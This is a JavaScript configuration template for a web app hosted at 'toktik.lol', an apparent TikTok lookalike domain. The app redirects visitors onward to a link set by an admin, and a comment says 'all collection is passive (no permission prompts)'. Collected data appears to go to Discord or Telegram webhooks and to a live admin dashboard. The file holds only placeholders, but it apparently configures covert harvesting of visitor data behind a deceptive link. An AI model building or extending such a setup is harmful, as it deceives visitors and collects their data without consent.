// Copy to config.js and fill in your values
window.APP_CONFIG = {
  sitePublicUrl: "https://toktik.lol",
  // Fallback only; admin sets the real link in /admin/
  redirectUrl: "https://www.facebook.com",

  // Supabase project (free tier): https://supabase.com
  supabaseUrl: "https://YOUR_PROJECT.supabase.co",
  supabaseAnonKey: "YOUR_ANON_KEY",

  // All collection is passive (no permission prompts)

  // Client-side webhooks (URLs/tokens are visible in the page source).
  // Prefer Supabase Database Webhooks for production — see supabase/migration_v4.sql
  webhooksEnabled: true,
  discordWebhookUrl: "", // https://discord.com/api/webhooks/...
  telegramBotToken: "", // 123456:ABC...
  telegramChatId: "", // numeric chat id

  // Admin dashboard live stream
  realtimeEnabled: true,
};
